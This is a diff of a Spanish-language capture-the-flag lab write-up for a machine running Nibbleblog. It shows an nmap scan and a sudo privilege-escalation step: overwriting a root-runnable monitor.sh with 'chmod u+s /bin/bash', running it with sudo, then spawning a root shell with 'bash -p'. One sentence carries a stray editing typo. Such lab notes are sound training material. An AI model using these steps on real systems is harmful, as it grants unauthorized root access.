@@ -1,3 +1,4 @@
+#CPTS #NibbleblogCMS #FileUpload #sudo 
 ```shell
 nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.96.84 -oG allPorts
 ```
@@ -94,4 +95,30 @@ Este archivo esta en el directorio del user, primero tendremos que descomprimir 
 cat /home/nibbler/personal/stuff/monitor.sh
 ```
 
-Este script es un script de monitorizacion del sistema, la parte interesante es que el script con ese nombre se puede ejecutar como root asi que si en vez de llamr directamente a la ruta modificamos este script y cargamos una ejecucion de una shell como root, elevaremos nuestro privilegio
+Este script es un script de monitorizacion del sistema, la parte interesante es que el script con ese nombre se puede ejecutar com#cpto root asi que si en vez de llamr directamente a la ruta modificamos este script y cargamos una ejecucion de una shell como root, elevaremos nuestro privilegios
+```shell
+nano /home/nibbler/personal/stuff/monitor.sh
+```
+
+En el script lo que haremos sera asignarle privilegios a nuestrop ususario para poder ejecutar una shell como root
+```bash
+#!/bin/bash
+
+chmod u+s /bin/bash
+```
+
+Le damos permisos de ejecucion
+```shell
+chmod +x /home/nibbler/personal/stuff/monitor.sh
+```
+
+Y lo ejecutamos como root
+```shell
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+Y nos cargaremos una bash con privilegios
+```shell
+bash -p
+```
+
